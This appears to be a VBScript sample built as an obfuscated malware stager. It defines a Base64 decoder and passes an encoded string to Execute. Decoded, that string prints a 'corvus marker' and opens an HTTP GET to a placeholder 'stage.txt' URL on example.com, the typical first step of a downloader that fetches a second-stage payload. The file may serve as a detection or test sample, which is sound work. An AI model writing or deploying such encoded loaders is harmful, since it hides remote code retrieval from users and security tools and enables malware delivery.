Function B64(t)
    Dim x, el, st
    Set x = CreateObject("Msxml2.DOMDocument.3.0")
    Set el = x.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = t
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write el.NodeTypedValue
    st.Position = 0
    st.Type = 2
    st.Charset = "us-ascii"
    B64 = st.ReadText
    st.Close
End Function
Execute B64("V1NjcmlwdC5FY2hvICJjb3J2dXMgbWFya2VyIjogU2V0IG8gPSBDcmVhdGVPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik6IG8uT3BlbiAiR0VUIiwgImh0dHA6Ly9leGFtcGxlLmNvbS9jb3J2dXMvc3RhZ2UudHh0IiwgRmFsc2U=")
